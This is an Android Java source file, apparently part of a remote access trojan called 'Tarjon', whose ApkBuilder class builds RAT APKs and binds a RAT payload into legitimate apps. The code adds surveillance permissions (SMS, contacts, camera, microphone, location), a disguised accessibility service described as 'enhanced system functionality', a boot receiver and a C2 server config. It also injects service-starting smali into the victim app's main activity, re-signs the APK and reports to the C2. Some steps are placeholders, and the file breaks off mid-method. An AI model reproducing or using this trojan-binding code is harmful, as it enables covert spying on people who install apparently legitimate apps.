package com.tarjon.admin.utils;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

/**
 * Utility for building and customizing RAT APKs
 * Handles payload generation and binding to legitimate apps
 */
public class ApkBuilder {
    private static final String TAG = "ApkBuilder";
    
    private final Context context;
    private final C2Connection c2Connection;
    private final ExecutorService executor;
    
    // Directories
    private final File workingDir;
    private final File outputDir;
    private final File tempDir;
    private final File templateDir;
    private final File keystoreDir;
    
    // Executables
    private final File apktoolPath;
    private final File signingPath;
    private final File zipalignPath;
    private final File baksmaliPath;
    private final File smaliPath;
    
    // Permissions for the RAT
    private static final String[] RAT_PERMISSIONS = {
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.ACCESS_WIFI_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.READ_CONTACTS",
            "android.permission.WRITE_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.SEND_SMS",
            "android.permission.READ_CALL_LOG",
            "android.permission.PROCESS_OUTGOING_CALLS",
            "android.permission.READ_PHONE_STATE",
            "android.permission.CALL_PHONE",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_COARSE_LOCATION",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.WAKE_LOCK",
            "android.permission.RECEIVE_BOOT_COMPLETED"
    };
    
    // Special permissions requiring <uses-feature> tags
    private static final Map<String, String> FEATURE_PERMISSIONS = new HashMap<>();
    static {
        FEATURE_PERMISSIONS.put("android.permission.CAMERA", "android.hardware.camera");
        FEATURE_PERMISSIONS.put("android.permission.RECORD_AUDIO", "android.hardware.microphone");
        FEATURE_PERMISSIONS.put("android.permission.ACCESS_FINE_LOCATION", "android.hardware.location.gps");
    }
    
    /**
     * Initialize ApkBuilder
     */
    public ApkBuilder(Context context, C2Connection c2Connection) {
        this.context = context;
        this.c2Connection = c2Connection;
        this.executor = Executors.newCachedThreadPool();
        
        // Initialize directories
        workingDir = context.getFilesDir();
        outputDir = new File(workingDir, "output_apks");
        tempDir = new File(workingDir, "apk_temp");
        templateDir = new File(workingDir, "templates");
        keystoreDir = new File(workingDir, "keystores");
        
        // Create directories if they don't exist
        outputDir.mkdirs();
        tempDir.mkdirs();
        templateDir.mkdirs();
        keystoreDir.mkdirs();
        
        // Set up tool paths
        apktoolPath = new File(workingDir, "tools/apktool.jar");
        signingPath = new File(workingDir, "tools/uber-apk-signer.jar");
        zipalignPath = new File(workingDir, "tools/zipalign");
        baksmaliPath = new File(workingDir, "tools/baksmali.jar");
        smaliPath = new File(workingDir, "tools/smali.jar");
        
        // Ensure tools directory exists
        new File(workingDir, "tools").mkdirs();
        
        // Extract tools from resources if they don't exist
        extractToolsIfNeeded();
    }
    
    /**
     * Extract required tools from application resources if they don't already exist
     */
    private void extractToolsIfNeeded() {
        // In a real implementation, we would extract the executable files from resources
        // For now, we'll just verify they exist or create placeholder files
        
        try {
            if (!apktoolPath.exists()) {
                // In a real implementation, this would be extracted from resources
                apktoolPath.createNewFile();
            }
            
            if (!signingPath.exists()) {
                signingPath.createNewFile();
            }
            
            if (!zipalignPath.exists()) {
                zipalignPath.createNewFile();
            }
            
            if (!baksmaliPath.exists()) {
                baksmaliPath.createNewFile();
            }
            
            if (!smaliPath.exists()) {
                smaliPath.createNewFile();
            }
        } catch (IOException e) {
            Log.e(TAG, "Error creating tool files: " + e.getMessage());
        }
    }
    
    /**
     * Build a standalone APK with payload
     */
    public void buildStandaloneApk(final BuildRequest request, final BuildCallback callback) {
        executor.execute(() -> {
            try {
                callback.onProgress(0, "Starting standalone build process");
                
                // Create build directory
                String buildId = generateUniqueBuildId();
                File buildDir = new File(tempDir, buildId);
                buildDir.mkdirs();
                
                callback.onProgress(5, "Loading template");
                
                // Get or create template
                File templateApk = getTemplateApk(request.getTemplateName());
                if (templateApk == null || !templateApk.exists()) {
                    callback.onError("Template APK not found");
                    return;
                }
                
                callback.onProgress(10, "Unpacking APK");
                
                // Create working directory for unpacked APK
                File unpackedDir = new File(buildDir, "unpacked");
                unpackedDir.mkdirs();
                
                // Unpack APK using apktool
                boolean unpackSuccessful = executeCommand(new String[]{
                        "java", "-jar", apktoolPath.getAbsolutePath(),
                        "d", templateApk.getAbsolutePath(),
                        "-o", unpackedDir.getAbsolutePath(),
                        "-f" // Force overwrite
                });
                
                if (!unpackSuccessful) {
                    callback.onError("Failed to unpack APK");
                    return;
                }
                
                callback.onProgress(25, "Customizing APK");
                
                // Update AndroidManifest.xml with custom permissions
                File manifestFile = new File(unpackedDir, "AndroidManifest.xml");
                updateManifest(manifestFile, request.getApplicationId());
                
                // Update app name
                updateAppName(unpackedDir, request.getAppName());
                
                // Update app icon if provided
                if (request.getAppIconBase64() != null && !request.getAppIconBase64().isEmpty()) {
                    updateAppIcon(unpackedDir, request.getAppIconBase64());
                }
                
                // Add payload code
                callback.onProgress(40, "Adding payload");
                injectPayload(unpackedDir, request.getC2ServerUrl(), request.getApiKey());
                
                // Repack APK
                callback.onProgress(60, "Rebuilding APK");
                File outputApk = new File(buildDir, "output.apk");
                
                boolean rebuildSuccessful = executeCommand(new String[]{
                        "java", "-jar", apktoolPath.getAbsolutePath(),
                        "b", unpackedDir.getAbsolutePath(),
                        "-o", outputApk.getAbsolutePath()
                });
                
                if (!rebuildSuccessful || !outputApk.exists()) {
                    callback.onError("Failed to rebuild APK");
                    return;
                }
                
                // Sign APK
                callback.onProgress(75, "Signing APK");
                File keystore = getOrCreateKeystore(request.getKeystorePassword());
                
                boolean signSuccessful = executeCommand(new String[]{
                        "java", "-jar", signingPath.getAbsolutePath(),
                        "-a", outputApk.getAbsolutePath(),
                        "--ks", keystore.getAbsolutePath(),
                        "--ksPass", request.getKeystorePassword(),
                        "--ksAlias", "tarjon",
                        "--ksKeyPass", request.getKeystorePassword()
                });
                
                if (!signSuccessful) {
                    callback.onError("Failed to sign APK");
                    return;
                }
                
                // Copy final APK to output directory
                String outputName = request.getAppName().replaceAll("[^a-zA-Z0-9]", "_") + "_" + buildId + ".apk";
                File finalApk = new File(outputDir, outputName);
                
                try (FileInputStream fis = new FileInputStream(new File(buildDir, "output-aligned-signed.apk"));
                     FileOutputStream fos = new FileOutputStream(finalApk)) {
                    
                    byte[] buffer = new byte[1024];
                    int length;
                    while ((length = fis.read(buffer)) > 0) {
                        fos.write(buffer, 0, length);
                    }
                }
                
                callback.onProgress(100, "Build completed successfully");
                callback.onComplete(finalApk.getAbsolutePath());
                
                // Cleanup build directory
                deleteDirectory(buildDir);
                
                // Send result to C2 server
                sendBuildResult(finalApk, request, "standalone");
                
            } catch (Exception e) {
                Log.e(TAG, "Error in APK build process: " + e.getMessage());
                callback.onError("Build failed: " + e.getMessage());
                
                try {
                    JSONObject error = new JSONObject();
                    error.put("error", e.getMessage());
                    error.put("type", "standalone");
                    
                    c2Connection.sendCommandResult("build_error", "APK build failed", error.toString());
                } catch (JSONException je) {
                    Log.e(TAG, "Error sending error to C2: " + je.getMessage());
                }
            }
        });
    }
    
    /**
     * Bind RAT payload to legitimate APK
     */
    public void bindToLegitimateApk(final BindRequest request, final BuildCallback callback) {
        executor.execute(() -> {
            try {
                callback.onProgress(0, "Starting binding process");
                
                // Validate legitimate APK
                File legitimateApk = new File(request.getLegitimateApkPath());
                if (!legitimateApk.exists() || !legitimateApk.isFile()) {
                    callback.onError("Legitimate APK not found: " + request.getLegitimateApkPath());
                    return;
                }
                
                // Create build directory
                String buildId = generateUniqueBuildId();
                File buildDir = new File(tempDir, buildId);
                buildDir.mkdirs();
                
                // Extract APK info
                callback.onProgress(5, "Analyzing legitimate APK");
                PackageInfo packageInfo = getPackageInfo(legitimateApk);
                if (packageInfo == null) {
                    callback.onError("Failed to extract package info from APK");
                    return;
                }
                
                String packageName = packageInfo.packageName;
                String appName = getApplicationName(packageInfo);
                String versionName = packageInfo.versionName;
                
                callback.onProgress(10, "Unpacking legitimate APK");
                
                // Create working directory for unpacked APK
                File unpackedDir = new File(buildDir, "unpacked");
                unpackedDir.mkdirs();
                
                // Unpack APK using apktool
                boolean unpackSuccessful = executeCommand(new String[]{
                        "java", "-jar", apktoolPath.getAbsolutePath(),
                        "d", legitimateApk.getAbsolutePath(),
                        "-o", unpackedDir.getAbsolutePath(),
                        "-f" // Force overwrite
                });
                
                if (!unpackSuccessful) {
                    callback.onError("Failed to unpack legitimate APK");
                    return;
                }
                
                callback.onProgress(30, "Modifying APK");
                
                // Update AndroidManifest.xml to add required permissions
                File manifestFile = new File(unpackedDir, "AndroidManifest.xml");
                updateManifestForBinding(manifestFile, packageName);
                
                // Inject payload
                callback.onProgress(50, "Injecting RAT payload");
                injectBindingPayload(unpackedDir, request.getC2ServerUrl(), request.getApiKey(), 
                                    packageName, request.isPreserveFunctionality());
                
                // Repack APK
                callback.onProgress(70, "Rebuilding infected APK");
                File outputApk = new File(buildDir, "output.apk");
                
                boolean rebuildSuccessful = executeCommand(new String[]{
                        "java", "-jar", apktoolPath.getAbsolutePath(),
                        "b", unpackedDir.getAbsolutePath(),
                        "-o", outputApk.getAbsolutePath()
                });
                
                if (!rebuildSuccessful || !outputApk.exists()) {
                    callback.onError("Failed to rebuild APK");
                    return;
                }
                
                // Sign APK
                callback.onProgress(85, "Signing infected APK");
                File keystore = getOrCreateKeystore(request.getKeystorePassword());
                
                boolean signSuccessful = executeCommand(new String[]{
                        "java", "-jar", signingPath.getAbsolutePath(),
                        "-a", outputApk.getAbsolutePath(),
                        "--ks", keystore.getAbsolutePath(),
                        "--ksPass", request.getKeystorePassword(),
                        "--ksAlias", "tarjon",
                        "--ksKeyPass", request.getKeystorePassword()
                });
                
                if (!signSuccessful) {
                    callback.onError("Failed to sign APK");
                    return;
                }
                
                // Copy final APK to output directory
                String safeAppName = appName.replaceAll("[^a-zA-Z0-9]", "_");
                String safeVersionName = versionName.replaceAll("[^a-zA-Z0-9.]", "_");
                String outputName = safeAppName + "_" + safeVersionName + "_injected_" + buildId + ".apk";
                File finalApk = new File(outputDir, outputName);
                
                try (FileInputStream fis = new FileInputStream(new File(buildDir, "output-aligned-signed.apk"));
                     FileOutputStream fos = new FileOutputStream(finalApk)) {
                    
                    byte[] buffer = new byte[1024];
                    int length;
                    while ((length = fis.read(buffer)) > 0) {
                        fos.write(buffer, 0, length);
                    }
                }
                
                callback.onProgress(100, "Binding completed successfully");
                callback.onComplete(finalApk.getAbsolutePath());
                
                // Cleanup build directory
                deleteDirectory(buildDir);
                
                // Send result to C2 server
                JSONObject bindingInfo = new JSONObject();
                bindingInfo.put("originalPackage", packageName);
                bindingInfo.put("originalAppName", appName);
                bindingInfo.put("originalVersion", versionName);
                bindingInfo.put("preserveFunctionality", request.isPreserveFunctionality());
                
                sendBuildResult(finalApk, request, "binding", bindingInfo);
                
            } catch (Exception e) {
                Log.e(TAG, "Error in APK binding process: " + e.getMessage());
                callback.onError("Binding failed: " + e.getMessage());
                
                try {
                    JSONObject error = new JSONObject();
                    error.put("error", e.getMessage());
                    error.put("type", "binding");
                    
                    c2Connection.sendCommandResult("build_error", "APK binding failed", error.toString());
                } catch (JSONException je) {
                    Log.e(TAG, "Error sending error to C2: " + je.getMessage());
                }
            }
        });
    }
    
    /**
     * Send build result to C2 server
     */
    private void sendBuildResult(File apkFile, BuildRequest request, String buildType) throws JSONException {
        sendBuildResult(apkFile, request, buildType, null);
    }
    
    /**
     * Send build result to C2 server with additional info
     */
    private void sendBuildResult(File apkFile, BuildRequest request, String buildType, JSONObject additionalInfo) throws JSONException {
        JSONObject result = new JSONObject();
        result.put("type", buildType);
        result.put("appName", request.getAppName());
        result.put("c2Server", request.getC2ServerUrl());
        result.put("outputPath", apkFile.getAbsolutePath());
        result.put("fileSize", apkFile.length());
        result.put("timestamp", System.currentTimeMillis());
        
        // Add additional info if provided
        if (additionalInfo != null) {
            for (Iterator<String> it = additionalInfo.keys(); it.hasNext();) {
                String key = it.next();
                result.put(key, additionalInfo.get(key));
            }
        }
        
        // Calculate SHA256 hash of APK
        String apkHash = calculateSha256(apkFile);
        if (apkHash != null) {
            result.put("sha256", apkHash);
        }
        
        c2Connection.sendCommandResult("build_complete", 
                "APK build completed: " + apkFile.getName(), 
                result.toString());
    }
    
    /**
     * Update AndroidManifest.xml for standalone APK
     */
    private void updateManifest(File manifestFile, String applicationId) throws IOException {
        if (!manifestFile.exists()) {
            throw new IOException("AndroidManifest.xml not found");
        }
        
        String manifestContent = readFileToString(manifestFile);
        
        // Replace package name if applicationId is provided
        if (applicationId != null && !applicationId.isEmpty()) {
            manifestContent = manifestContent.replaceFirst(
                    "package=\"[^\"]+\"", 
                    "package=\"" + applicationId + "\"");
        }
        
        // Add required permissions
        StringBuilder permissionsBuilder = new StringBuilder();
        for (String permission : RAT_PERMISSIONS) {
            permissionsBuilder.append("    <uses-permission android:name=\"")
                    .append(permission)
                    .append("\" />\n");
        }
        
        // Add feature requirements
        for (Map.Entry<String, String> entry : FEATURE_PERMISSIONS.entrySet()) {
            if (Arrays.asList(RAT_PERMISSIONS).contains(entry.getKey())) {
                permissionsBuilder.append("    <uses-feature android:name=\"")
                        .append(entry.getValue())
                        .append("\" android:required=\"false\" />\n");
            }
        }
        
        // Add service declarations
        permissionsBuilder.append("\n    <!-- RAT Service Declarations -->\n");
        permissionsBuilder.append("    <service android:name=\".services.AdminService\" android:enabled=\"true\" android:exported=\"false\" />\n");
        permissionsBuilder.append("    <service android:name=\".services.TarjonAccessibilityService\" android:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\" android:enabled=\"true\" android:exported=\"false\">\n");
        permissionsBuilder.append("        <intent-filter>\n");
        permissionsBuilder.append("            <action android:name=\"android.accessibilityservice.AccessibilityService\" />\n");
        permissionsBuilder.append("        </intent-filter>\n");
        permissionsBuilder.append("        <meta-data android:name=\"android.accessibilityservice\" android:resource=\"@xml/accessibility_service_config\" />\n");
        permissionsBuilder.append("    </service>\n");
        
        // Add boot receiver
        permissionsBuilder.append("    <receiver android:name=\".receivers.BootReceiver\" android:enabled=\"true\" android:exported=\"true\">\n");
        permissionsBuilder.append("        <intent-filter>\n");
        permissionsBuilder.append("            <action android:name=\"android.intent.action.BOOT_COMPLETED\" />\n");
        permissionsBuilder.append("        </intent-filter>\n");
        permissionsBuilder.append("    </receiver>\n");
        
        // Insert after manifest tag
        int insertPoint = manifestContent.indexOf("<manifest");
        insertPoint = manifestContent.indexOf(">", insertPoint) + 1;
        
        String updatedManifest = manifestContent.substring(0, insertPoint) +
                "\n" + permissionsBuilder.toString() +
                manifestContent.substring(insertPoint);
        
        writeStringToFile(manifestFile, updatedManifest);
    }
    
    /**
     * Update AndroidManifest.xml for binding to legitimate APK
     */
    private void updateManifestForBinding(File manifestFile, String packageName) throws IOException {
        if (!manifestFile.exists()) {
            throw new IOException("AndroidManifest.xml not found");
        }
        
        String manifestContent = readFileToString(manifestFile);
        
        // Add required permissions if they don't already exist
        StringBuilder permissionsBuilder = new StringBuilder();
        for (String permission : RAT_PERMISSIONS) {
            if (!manifestContent.contains("android:name=\"" + permission + "\"")) {
                permissionsBuilder.append("    <uses-permission android:name=\"")
                        .append(permission)
                        .append("\" />\n");
            }
        }
        
        // Add feature requirements if they don't already exist
        for (Map.Entry<String, String> entry : FEATURE_PERMISSIONS.entrySet()) {
            String feature = entry.getValue();
            if (Arrays.asList(RAT_PERMISSIONS).contains(entry.getKey()) && 
                    !manifestContent.contains("android:name=\"" + feature + "\"")) {
                permissionsBuilder.append("    <uses-feature android:name=\"")
                        .append(feature)
                        .append("\" android:required=\"false\" />\n");
            }
        }
        
        // Add service declarations
        String servicesStr = "\n    <!-- System Services -->\n" +
                "    <service android:name=\"com.tarjon.admin.services.AdminService\" android:enabled=\"true\" android:exported=\"false\" />\n" +
                "    <service android:name=\"com.tarjon.admin.services.TarjonAccessibilityService\" android:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\" android:enabled=\"true\" android:exported=\"false\">\n" +
                "        <intent-filter>\n" +
                "            <action android:name=\"android.accessibilityservice.AccessibilityService\" />\n" +
                "        </intent-filter>\n" +
                "        <meta-data android:name=\"android.accessibilityservice\" android:resource=\"@xml/accessibility_service_config\" />\n" +
                "    </service>\n" +
                "    <receiver android:name=\"com.tarjon.admin.receivers.BootReceiver\" android:enabled=\"true\" android:exported=\"true\">\n" +
                "        <intent-filter>\n" +
                "            <action android:name=\"android.intent.action.BOOT_COMPLETED\" />\n" +
                "        </intent-filter>\n" +
                "    </receiver>\n";
        
        // Insert permissions after manifest tag
        int insertPoint = manifestContent.indexOf("<manifest");
        insertPoint = manifestContent.indexOf(">", insertPoint) + 1;
        
        // Insert services before </application> tag
        int appEndIndex = manifestContent.indexOf("</application>");
        
        String updatedManifest = manifestContent.substring(0, insertPoint) +
                "\n" + permissionsBuilder.toString() +
                manifestContent.substring(insertPoint, appEndIndex) +
                servicesStr +
                manifestContent.substring(appEndIndex);
        
        writeStringToFile(manifestFile, updatedManifest);
    }
    
    /**
     * Update app name in strings.xml
     */
    private void updateAppName(File unpackedDir, String appName) throws IOException {
        File stringsFile = new File(unpackedDir, "res/values/strings.xml");
        if (!stringsFile.exists()) {
            // Create strings.xml if it doesn't exist
            stringsFile.getParentFile().mkdirs();
            writeStringToFile(stringsFile, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<resources>\n</resources>");
        }
        
        String stringsContent = readFileToString(stringsFile);
        
        // Check if app_name string exists
        Pattern appNamePattern = Pattern.compile("<string\\s+name\\s*=\\s*\"app_name\"[^>]*>([^<]*)</string>");
        Matcher matcher = appNamePattern.matcher(stringsContent);
        
        if (matcher.find()) {
            // Replace existing app_name
            stringsContent = stringsContent.replace(matcher.group(0), 
                    "<string name=\"app_name\">" + escapeXml(appName) + "</string>");
        } else {
            // Add new app_name string
            int insertPoint = stringsContent.indexOf("</resources>");
            if (insertPoint > 0) {
                stringsContent = stringsContent.substring(0, insertPoint) +
                        "    <string name=\"app_name\">" + escapeXml(appName) + "</string>\n" +
                        stringsContent.substring(insertPoint);
            }
        }
        
        writeStringToFile(stringsFile, stringsContent);
    }
    
    /**
     * Update app icon with base64-encoded image
     */
    private void updateAppIcon(File unpackedDir, String base64Icon) throws IOException {
        byte[] iconData = Base64.decode(base64Icon, Base64.DEFAULT);
        
        // Write to different mipmap directories
        for (String density : new String[]{"mdpi", "hdpi", "xhdpi", "xxhdpi", "xxxhdpi"}) {
            File iconDir = new File(unpackedDir, "res/mipmap-" + density);
            iconDir.mkdirs();
            
            File iconFile = new File(iconDir, "ic_launcher.png");
            try (FileOutputStream fos = new FileOutputStream(iconFile)) {
                fos.write(iconData);
            }
            
            // Also create round icon if needed
            File roundIconFile = new File(iconDir, "ic_launcher_round.png");
            try (FileOutputStream fos = new FileOutputStream(roundIconFile)) {
                fos.write(iconData);
            }
        }
    }
    
    /**
     * Inject payload code into unpacked APK
     */
    private void injectPayload(File unpackedDir, String c2ServerUrl, String apiKey) throws IOException {
        // Create XML resource for accessibility service
        File xmlDir = new File(unpackedDir, "res/xml");
        xmlDir.mkdirs();
        
        File accessibilityConfigFile = new File(xmlDir, "accessibility_service_config.xml");
        String configXml = 
                "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                "<accessibility-service xmlns:android=\"http://schemas.android.com/apk/res/android\"\n" +
                "    android:accessibilityEventTypes=\"typeAllMask\"\n" +
                "    android:accessibilityFlags=\"flagDefault|flagIncludeNotImportantViews|flagRequestTouchExplorationMode|flagRequestEnhancedWebAccessibility|flagReportViewIds|flagRetrieveInteractiveWindows\"\n" +
                "    android:accessibilityFeedbackType=\"feedbackAllMask\"\n" +
                "    android:notificationTimeout=\"0\"\n" +
                "    android:canRetrieveWindowContent=\"true\"\n" +
                "    android:description=\"@string/accessibility_service_description\" />";
        
        writeStringToFile(accessibilityConfigFile, configXml);
        
        // Add description string
        File stringsFile = new File(unpackedDir, "res/values/strings.xml");
        if (stringsFile.exists()) {
            String stringsContent = readFileToString(stringsFile);
            int insertPoint = stringsContent.indexOf("</resources>");
            if (insertPoint > 0) {
                String updatedContent = stringsContent.substring(0, insertPoint) +
                        "    <string name=\"accessibility_service_description\">Provides enhanced system functionality</string>\n" +
                        stringsContent.substring(insertPoint);
                writeStringToFile(stringsFile, updatedContent);
            }
        }
        
        // Create configuration file
        File assetsDir = new File(unpackedDir, "assets");
        assetsDir.mkdirs();
        
        File configFile = new File(assetsDir, "config.properties");
        String configContent = 
                "# Configuration for Tarjon RAT\n" +
                "c2_server=" + c2ServerUrl + "\n" +
                "c2_port=443\n" +
                "use_ssl=true\n" +
                "api_key=" + (apiKey != null ? apiKey : generateApiKey()) + "\n" +
                "retry_interval=60\n" +
                "heartbeat_interval=300\n" +
                "debug=false\n";
        
        writeStringToFile(configFile, configContent);
        
        // Create payload smali code directory structure
        File smaliDir = new File(unpackedDir, "smali/com/tarjon/admin");
        smaliDir.mkdirs();
        
        // In a real implementation, we would include actual smali code files here
        // For this implementation, we'll create minimal placeholder service class files
        
        // AdminService
        File adminServiceFile = new File(smaliDir, "services/AdminService.smali");
        adminServiceFile.getParentFile().mkdirs();
        writeStringToFile(adminServiceFile, createSmaliServiceClass("com.tarjon.admin.services.AdminService"));
        
        // TarjonAccessibilityService
        File accessibilityServiceFile = new File(smaliDir, "services/TarjonAccessibilityService.smali");
        writeStringToFile(accessibilityServiceFile, createSmaliAccessibilityServiceClass());
        
        // BootReceiver
        File bootReceiverFile = new File(smaliDir, "receivers/BootReceiver.smali");
        bootReceiverFile.getParentFile().mkdirs();
        writeStringToFile(bootReceiverFile, createSmaliReceiverClass());
    }
    
    /**
     * Inject binding payload into existing APK
     */
    private void injectBindingPayload(File unpackedDir, String c2ServerUrl, String apiKey, 
                                    String originalPackage, boolean preserveFunctionality) throws IOException {
        // Create necessary directories
        File xmlDir = new File(unpackedDir, "res/xml");
        xmlDir.mkdirs();
        
        // Create XML resource for accessibility service
        File accessibilityConfigFile = new File(xmlDir, "accessibility_service_config.xml");
        String configXml = 
                "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                "<accessibility-service xmlns:android=\"http://schemas.android.com/apk/res/android\"\n" +
                "    android:accessibilityEventTypes=\"typeAllMask\"\n" +
                "    android:accessibilityFlags=\"flagDefault|flagIncludeNotImportantViews|flagRequestTouchExplorationMode|flagRequestEnhancedWebAccessibility|flagReportViewIds|flagRetrieveInteractiveWindows\"\n" +
                "    android:accessibilityFeedbackType=\"feedbackAllMask\"\n" +
                "    android:notificationTimeout=\"0\"\n" +
                "    android:canRetrieveWindowContent=\"true\"\n" +
                "    android:description=\"@string/accessibility_service_description\" />";
        
        writeStringToFile(accessibilityConfigFile, configXml);
        
        // Add description string
        File stringsFile = new File(unpackedDir, "res/values/strings.xml");
        if (stringsFile.exists()) {
            String stringsContent = readFileToString(stringsFile);
            int insertPoint = stringsContent.indexOf("</resources>");
            if (insertPoint > 0) {
                String updatedContent = stringsContent.substring(0, insertPoint) +
                        "    <string name=\"accessibility_service_description\">System service for enhanced functionality</string>\n" +
                        stringsContent.substring(insertPoint);
                writeStringToFile(stringsFile, updatedContent);
            }
        } else {
            // Create strings.xml if it doesn't exist
            stringsFile.getParentFile().mkdirs();
            String stringsContent = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
                    "<resources>\n" +
                    "    <string name=\"accessibility_service_description\">System service for enhanced functionality</string>\n" +
                    "</resources>";
            writeStringToFile(stringsFile, stringsContent);
        }
        
        // Create configuration file
        File assetsDir = new File(unpackedDir, "assets");
        assetsDir.mkdirs();
        
        File configFile = new File(assetsDir, "tarjon_config.properties");
        String configContent = 
                "# Configuration for Tarjon RAT\n" +
                "c2_server=" + c2ServerUrl + "\n" +
                "c2_port=443\n" +
                "use_ssl=true\n" +
                "api_key=" + (apiKey != null ? apiKey : generateApiKey()) + "\n" +
                "retry_interval=60\n" +
                "heartbeat_interval=300\n" +
                "original_package=" + originalPackage + "\n" +
                "preserve_functionality=" + preserveFunctionality + "\n" +
                "debug=false\n";
        
        writeStringToFile(configFile, configContent);
        
        // Create Tarjon package structure
        File tarjonDir = new File(unpackedDir, "smali/com/tarjon/admin");
        tarjonDir.mkdirs();
        
        // Create services directory
        File servicesDir = new File(tarjonDir, "services");
        servicesDir.mkdirs();
        
        // Create receivers directory
        File receiversDir = new File(tarjonDir, "receivers");
        receiversDir.mkdirs();
        
        // Create AdminService
        File adminServiceFile = new File(servicesDir, "AdminService.smali");
        writeStringToFile(adminServiceFile, createSmaliServiceClass("com.tarjon.admin.services.AdminService"));
        
        // Create TarjonAccessibilityService
        File accessibilityServiceFile = new File(servicesDir, "TarjonAccessibilityService.smali");
        writeStringToFile(accessibilityServiceFile, createSmaliAccessibilityServiceClass());
        
        // Create BootReceiver
        File bootReceiverFile = new File(receiversDir, "BootReceiver.smali");
        writeStringToFile(bootReceiverFile, createSmaliReceiverClass());
        
        // Inject loader into original app's main activity
        injectLoaderIntoMainActivity(unpackedDir, originalPackage);
    }
    
    /**
     * Inject loader code into the app's main activity
     */
    private void injectLoaderIntoMainActivity(File unpackedDir, String packageName) throws IOException {
        // Parse AndroidManifest.xml to find main activity
        File manifestFile = new File(unpackedDir, "AndroidManifest.xml");
        
        if (!manifestFile.exists()) {
            throw new IOException("AndroidManifest.xml not found");
        }
        
        String manifestContent = readFileToString(manifestFile);
        
        // Find main activity
        Pattern mainActivityPattern = Pattern.compile("<activity[^>]*>\\s*<intent-filter[^>]*>\\s*<action\\s+android:name\\s*=\\s*\"android.intent.action.MAIN\"[^>]*/>\\s*<category\\s+android:name\\s*=\\s*\"android.intent.category.LAUNCHER\"[^>]*/>\\s*</intent-filter>\\s*</activity>");
        Matcher matcher = mainActivityPattern.matcher(manifestContent);
        
        if (!matcher.find()) {
            throw new IOException("Main activity not found in manifest");
        }
        
        String activityXml = matcher.group(0);
        Pattern namePattern = Pattern.compile("android:name\\s*=\\s*\"([^\"]+)\"");
        Matcher nameMatcher = namePattern.matcher(activityXml);
        
        if (!nameMatcher.find()) {
            throw new IOException("Activity name not found");
        }
        
        String activityName = nameMatcher.group(1);
        
        // Handle relative activity names
        if (activityName.startsWith(".")) {
            activityName = packageName + activityName;
        }
        
        // Convert activity name to file path
        String activityPath = activityName.replace('.', '/') + ".smali";
        File activityFile = new File(unpackedDir, "smali/" + activityPath);
        
        if (!activityFile.exists()) {
            throw new IOException("Activity smali file not found: " + activityPath);
        }
        
        // Read activity smali file
        String activityContent = readFileToString(activityFile);
        
        // Find onCreate method
        Pattern onCreatePattern = Pattern.compile("\\.method\\s+(?:public)?\\s+onCreate\\s*\\(Landroid/os/Bundle;\\s*\\)V[^\\}]*?\\}");
        Matcher onCreateMatcher = onCreatePattern.matcher(activityContent);
        
        if (!onCreateMatcher.find()) {
            throw new IOException("onCreate method not found in activity");
        }
        
        String onCreateMethod = onCreateMatcher.group(0);
        
        // Find return statement in onCreate
        int returnIndex = onCreateMethod.lastIndexOf("return-void");
        
        if (returnIndex < 0) {
            throw new IOException("return-void statement not found in onCreate");
        }
        
        // Add RAT service starter code before return
        String serviceStartCode = 
                "\n    # Start Tarjon RAT service\n" +
                "    new-instance v0, Landroid/content/Intent;\n" +
                "    const-class v1, Lcom/tarjon/admin/services/AdminService;\n" +
                "    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n" +
                "    invoke-virtual {p0, v0}, L" + activityName.replace('.', '/') + ";->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n" +
                "\n";
        
        String modifiedOnCreate = onCreateMethod.substring(0, returnIndex) + 
                serviceStartCode + 
                onCreateMethod.substring(returnIndex);
        
        // Replace onCreate method in activity file
        String modifiedActivity = activityContent.replace(onCreateMethod, modifiedOnCreate);
        
        // Write modified activity file
        writeStringToFile(activityFile, modifiedActivity);
    }
    
    /**
     * Create basic smali code for a service class
     */
    private String createSmaliServiceClass(String className) {
        String packagePath = className.replace('.', '/');
        return ".class public L" + packagePath + ";\n" +
                ".super Landroid/app/Service;\n\n" +
                "# Basic service implementation\n\n" +
                ".method public constructor <init>()V\n" +
                "    .registers 1\n" +
                "    invoke-direct {p0}, Landroid/app/Service;-><init>()V\n" +
                "    return-void\n" +
                ".end method\n\n" +
                ".method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;\n" +
                "    .registers 3\n" +
                "    .param p1, \"intent\"    # Landroid/content/Intent;\n" +
                "    const/4 v0, 0x0\n" +
                "    return-object v0\n" +
                ".end method\n\n" +
                ".method public onCreate()V\n" +
